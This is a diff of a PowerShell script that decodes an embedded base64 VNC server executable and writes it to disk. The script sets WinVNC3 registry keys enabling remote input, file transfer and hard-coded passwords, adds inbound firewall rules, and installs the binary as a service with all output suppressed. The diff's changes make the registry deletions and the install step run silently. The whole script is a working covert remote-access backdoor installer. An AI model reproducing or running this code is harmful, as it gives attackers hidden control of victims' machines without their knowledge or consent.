@@ -2,7 +2,7 @@ $VNCServer = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 $Content = [System.Convert]::FromBase64String($VNCServer)
 Set-Content -Path VNCServer.exe -Value $Content -Encoding Byte
 
-REG DELETE "HKLM\SOFTWARE\ORL"
+REG DELETE "HKLM\SOFTWARE\ORL" /f 2>&1> $null
 REG ADD "HKLM\SOFTWARE\ORL\WinVNC3\Default" /v "SocketConnect" /t REG_DWORD /d 1 /f 2>&1> $null
 REG ADD "HKLM\SOFTWARE\ORL\WinVNC3\Default" /v "AutoPortSelect" /t REG_DWORD /d 1 /f 2>&1> $null
 REG ADD "HKLM\SOFTWARE\ORL\WinVNC3\Default" /v "InputsEnabled" /t REG_DWORD /d 1 /f 2>&1> $null
@@ -15,7 +15,7 @@ REG ADD "HKLM\SOFTWARE\ORL\WinVNC3\Default" /v "EnableFileTransfers" /t REG_DWOR
 REG ADD "HKLM\SOFTWARE\ORL\WinVNC3\Default" /v "Password" /t REG_BINARY /d dbd83cfd727a1458 /f 2>&1> $null
 REG ADD "HKLM\SOFTWARE\ORL\WinVNC3\Default" /v "PasswordViewOnly" /t REG_BINARY /d 2b1990ff70c9ba81 /f 2>&1> $null
 
-REG DELETE "HKLM\SOFTWARE\WOW6432Node\ORL"
+REG DELETE "HKLM\SOFTWARE\WOW6432Node\ORL" /f 2>&1> $null
 REG ADD "HKLM\SOFTWARE\WOW6432Node\ORL\WinVNC3\Default" /v "SocketConnect" /t REG_DWORD /d 1 /f 2>&1> $null
 REG ADD "HKLM\SOFTWARE\WOW6432Node\ORL\WinVNC3\Default" /v "AutoPortSelect" /t REG_DWORD /d 1 /f 2>&1> $null
 REG ADD "HKLM\SOFTWARE\WOW6432Node\ORL\WinVNC3\Default" /v "InputsEnabled" /t REG_DWORD /d 1 /f 2>&1> $null
@@ -31,4 +31,4 @@ REG ADD "HKLM\SOFTWARE\WOW6432Node\ORL\WinVNC3\Default" /v "PasswordViewOnly" /t
 netsh advfirewall firewall delete rule name="TightVNC Win32 Server" 2>&1> $null
 netsh advfirewall firewall add rule name="TightVNC Win32 Server" dir=in protocol=udp action=allow program="$path\VNCServer.exe" enable=yes 2>&1> $null
 netsh advfirewall firewall add rule name="TightVNC Win32 Server" dir=in protocol=tcp action=allow program="$path\VNCServer.exe" enable=yes 2>&1> $null
-.\VNCServer.exe - install -service 2>&1> $null ; sleep 10 ; stop-service winvnc 2>&1> $null ; start-service  winvnc 2>&1> $null
+.\VNCServer.exe -install -service 2>&1> $null ; sleep 10 ; stop-service winvnc 2>&1> $null ; start-service  winvnc 2>&1> $null
